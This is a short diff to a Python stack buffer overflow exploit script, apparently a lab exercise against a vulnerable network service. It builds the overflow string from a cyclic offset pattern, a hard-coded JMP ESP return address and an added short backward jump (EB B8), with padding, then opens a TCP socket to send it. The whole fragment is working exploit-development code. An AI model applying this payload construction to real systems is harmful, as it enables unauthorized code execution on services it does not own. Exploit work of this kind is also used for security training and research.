@@ -10,11 +10,12 @@ cyclic_pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac
 
 
 #625011AF
-JMP_ESP = "\xaf\x11\x50\x62" # 0x625011AF
+JMP_ESP = "\xaf\x11\x50\x62"
+#EBB8
+JMP_70_BACK = "\xEB\xB8" # Nasm Shell
 
 #evilString = cyclic_pattern
-
-evilString = "A"*70 + JMP_ESP*4 + "C"*(256-4-7)
+evilString = "A"*70 + JMP_ESP + JMP_70_BACK + "C"*(256-4-7-4)
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
